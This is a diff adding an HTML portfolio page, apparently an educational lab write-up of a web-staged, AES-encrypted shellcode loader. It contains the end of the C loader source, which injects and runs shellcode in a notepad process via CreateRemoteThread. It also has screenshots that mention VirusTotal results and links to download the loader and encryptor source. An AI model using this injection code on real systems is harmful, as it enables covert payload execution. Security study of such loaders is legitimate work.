+        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, TRUE);
+        return 1;
+    }
+
+    // set CFG (Control Flow Guard) call targets
+    fnSetProcessValidCallTargets pSetProcessValidCallTargets =
+        (fnSetProcessValidCallTargets)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "SetProcessValidCallTargets");
+    if (pSetProcessValidCallTargets) {
+        CFG_CALL_TARGET_INFO cfgInfo = { 0, CFG_CALL_TARGET_VALID };
+        if (!pSetProcessValidCallTargets(hProc, pRemote, rsize, 1, &cfgInfo))
+            printf("(!) SetProcessValidCallTargets failed. Error=%lu (continuing)\n", GetLastError());
+    }
+
+    // create and execute remote thread
+    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);
+    if (!hThread) {
+        printf("(!) CreateRemoteThread failed. Error=%lu\n", GetLastError());
+        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, TRUE);
+        return 1;
+    }
+
+    ResumeThread(hMainThread);
+    printf("(+) injected successfully - remote thread handle=%p\n", hThread);
+    printf("(+) shellcode running in notepad process\n");
+
+    WaitForSingleObject(hThread, 3000);
+
+    // cleanup
+    CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
+    return 0;
+}
+
+      </code></pre>
+    </div>
+  </section>
+  </section>
+
+  <section class="panel" aria-labelledby="gallery-heading">
+    <h2 id="gallery-heading">Screenshots</h2>
+    <p class="gallery-subtitle">Click to enlarge</p>
+
+    <div class="gallery">
+      <figure>
+        <img src="/images/ctflfg/webloader1.png" alt="folder of all files">
+      </figure>
+
+      <figure>
+        <img src="/images/ctflfg/webloader2.png" alt="python server localhost root directory">
+      </figure>
+
+       <figure>
+        <img src="/images/ctflfg/webloader3.png" alt="success powershell message">
+      </figure>
+
+       <figure>
+        <img src="/images/ctflfg/webloader4.png" alt="success: calculator popped!">
+      </figure>
+
+      <figure>
+        <img src="/images/ctflfg/webloader5.png" alt="virustotal report results">
+      </figure>
+
+      <figure>
+        <img src="/images/ctflfg/webloader6.png" alt="hash of malware and stats of file along with virustotal summary">
+      </figure>
+    </div>
+
+  </section>
+
+  <section class="panel content" aria-labelledby="downloads-heading">
+    <h2 id="downloads-heading">Project Files</h2>
+
+    <p style="margin-bottom: 1rem;">
+      Source files are kept locally for review and documentation. This project is intended as an educational lab writeup, not a public release of software.
+    </p>
+
+    <div class="actions">
+      <a class="button-link" href="/downloads/WebStagedAESCBCLoader.c" download>Loader Source</a>
+      <a class="button-link" href="/downloads/WebStagedAESCBCEncrypt.c" download>Encryptor Source</a>
+    </div>
+  </section>
+
+  <nav class="actions">
+    <a class="button-link" href="portfolio.html">Back to Portfolio</a>
+  </nav>
+</main>
+
+<div class="lightbox" id="image-lightbox" aria-hidden="true">
+  <div class="lightbox-content">
+    <button class="lightbox-close" type="button" aria-label="Close enlarged image">Close</button>
+    <img id="lightbox-image" src="" alt="">
+  </div>
+</div>
+
+<script>
+  const lightbox = document.getElementById("image-lightbox");
+  const lightboxImage = document.getElementById("lightbox-image");
+  const closeButton = lightbox.querySelector(".lightbox-close");
+  const galleryImages = document.querySelectorAll(".gallery img");
+
+  function openLightbox(sourceImage) {
+    lightboxImage.src = sourceImage.src;
+    lightboxImage.alt = sourceImage.alt;
+    lightbox.classList.add("is-open");
+    document.body.style.overflow = "hidden";
+  }
+
+  function closeLightbox() {
+    lightbox.classList.remove("is-open");
+    lightboxImage.src = "";
+    document.body.style.overflow = "";
+  }
+
+  galleryImages.forEach(img => img.addEventListener("click", () => openLightbox(img)));
+  closeButton.addEventListener("click", closeLightbox);
+
+  lightbox.addEventListener("click", e => {
+    if (e.target === lightbox) closeLightbox();
+  });
+
+  document.addEventListener("keydown", e => {
+    if (e.key === "Escape") closeLightbox();
+  });
+
+  const codeToggles = document.querySelectorAll(".code-toggle");
+  codeToggles.forEach(toggle => {
+    const button = toggle.querySelector(".code-toggle-button");
+    const setLabel = () => {
+      const isOpen = toggle.classList.contains("is-open");
+      button.textContent = isOpen ? "See less" : "See more";
+      button.setAttribute("aria-expanded", String(isOpen));
+    };
+
+    button.addEventListener("click", () => {
+      toggle.classList.toggle("is-open");
+      setLabel();
+    });
+
+    setLabel();
+  });
+</script>
+</body>
+</html>
